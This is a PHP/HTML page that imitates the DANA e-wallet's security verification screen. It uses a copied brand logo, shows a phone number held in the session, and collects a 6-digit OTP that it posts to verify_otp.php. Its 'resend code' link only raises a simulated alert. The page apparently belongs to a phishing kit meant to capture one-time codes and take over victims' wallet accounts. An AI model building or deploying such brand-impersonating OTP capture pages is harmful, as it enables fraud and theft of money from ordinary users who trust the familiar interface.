<?php
session_start();
$phone = $_SESSION['phone'] ?? '+62 812 3456 7890';
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verifikasi - DANA</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            background: linear-gradient(145deg, #f5f9ff 0%, #e8f2fa 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 16px;
        }
        .card {
            background: white;
            padding: 40px 28px 32px;
            border-radius: 32px;
            box-shadow: 0 12px 40px rgba(0, 100, 200, 0.12), 0 4px 16px rgba(0,0,0,0.04);
            text-align: center;
            width: 100%;
            max-width: 360px;
        }
        .logo {
            margin: 0 auto 12px;
            display: block;
        }
        .lock-icon {
            margin: 6px auto 10px;
            display: block;
        }
        .title {
            font-size: 20px;
            font-weight: 700;
            color: #1a1a1a;
            margin-bottom: 4px;
        }
        .sub-info {
            font-size: 14px;
            color: #666;
            margin-bottom: 20px;
            line-height: 1.5;
        }
        .sub-info strong {
            color: #1a1a1a;
            font-weight: 600;
        }
        .otp-input-group {
            position: relative;
            margin-bottom: 16px;
        }
        .otp-input-group input {
            width: 100%;
            padding: 16px 16px 16px 52px;
            border: 1.5px solid #dce4ec;
            border-radius: 16px;
            font-size: 20px;
            text-align: center;
            letter-spacing: 6px;
            font-weight: 600;
            background: #fafcff;
            transition: all 0.2s;
            outline: none;
        }
        .otp-input-group input:focus {
            border-color: #0099ff;
            background: white;
            box-shadow: 0 0 0 4px rgba(0,153,255,0.08);
        }
        .otp-input-group .lock-left {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            opacity: 0.35;
        }
        .btn-verify {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #0099ff 0%, #0077dd 100%);
            border: none;
            border-radius: 24px;
            color: white;
            font-size: 17px;
            font-weight: 700;
            box-shadow: 0 6px 20px rgba(0,153,255,0.35);
            cursor: pointer;
            transition: all 0.15s;
            margin-top: 6px;
        }
        .btn-verify:active {
            transform: scale(0.97);
            box-shadow: 0 3px 10px rgba(0,153,255,0.25);
        }
        .resend-link {
            display: inline-block;
            margin-top: 16px;
            font-size: 14px;
            color: #0099ff;
            font-weight: 600;
            text-decoration: none;
            border-bottom: 1.5px dotted rgba(0,153,255,0.3);
        }
        .footer-note {
            font-size: 12px;
            color: #aaa;
            margin-top: 20px;
            letter-spacing: 0.3px;
        }
        .divider {
            border: none;
            border-top: 1px solid #edf2f7;
            margin: 20px 0 12px;
        }
    </style>
</head>
<body>
<div class="card">
    <!-- Logo DANA -->
    <svg class="logo" viewBox="0 0 200 60" width="120" height="36">
        <defs>
            <linearGradient id="logoGrad" x1="0%" y1="0%" x2="100%" y2="100%">
                <stop offset="0%" style="stop-color:#0099ff;stop-opacity:1" />
                <stop offset="100%" style="stop-color:#0066cc;stop-opacity:1" />
            </linearGradient>
        </defs>
        <rect x="0" y="10" width="40" height="40" rx="12" fill="url(#logoGrad)"/>
        <text x="10" y="39" font-family="Arial, sans-serif" font-size="24" font-weight="bold" fill="white">D</text>
        <text x="50" y="39" font-family="Arial, sans-serif" font-size="26" font-weight="700" fill="#1a1a1a">DANA</text>
    </svg>

    <!-- Ikon gembok -->
    <svg class="lock-icon" width="64" height="50" viewBox="0 0 64 50">
        <circle cx="32" cy="20" r="20" fill="#0099ff" opacity="0.08"/>
        <rect x="14" y="18" width="36" height="26" rx="4" fill="none" stroke="#0099ff" stroke-width="1.8"/>
        <path d="M22 18v-6a10 10 0 0 1 20 0v6" fill="none" stroke="#0099ff" stroke-width="1.8"/>
        <circle cx="32" cy="30" r="3" fill="#0099ff"/>
    </svg>

    <div class="title">Verifikasi keamanan</div>
    <div class="sub-info">
        Kode OTP telah dikirim ke<br>
        <strong><?php echo htmlspecialchars($phone); ?></strong>
    </div>

    <form action="verify_otp.php" method="POST">
        <div class="otp-input-group">
            <span class="lock-left">
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2">
                    <rect x="3" y="11" width="18" height="11" rx="2" stroke="currentColor"/>
                    <path d="M7 11V7a5 5 0 0 1 10 0v4" stroke="currentColor"/>
                </svg>
            </span>
            <input type="text" name="otp" placeholder="6 digit kode" maxlength="6" inputmode="numeric" pattern="[0-9]*" required autofocus>
        </div>
        <button type="submit" class="btn-verify">Verifikasi</button>
    </form>

    <a href="#" class="resend-link" onclick="alert('Kode baru telah dikirim (simulasi)'); return false;">Kirim ulang kode</a>

    <hr class="divider">
    <div class="footer-note">DANA • Dompet Digital Indonesia</div>
</div>
</body>
</html>
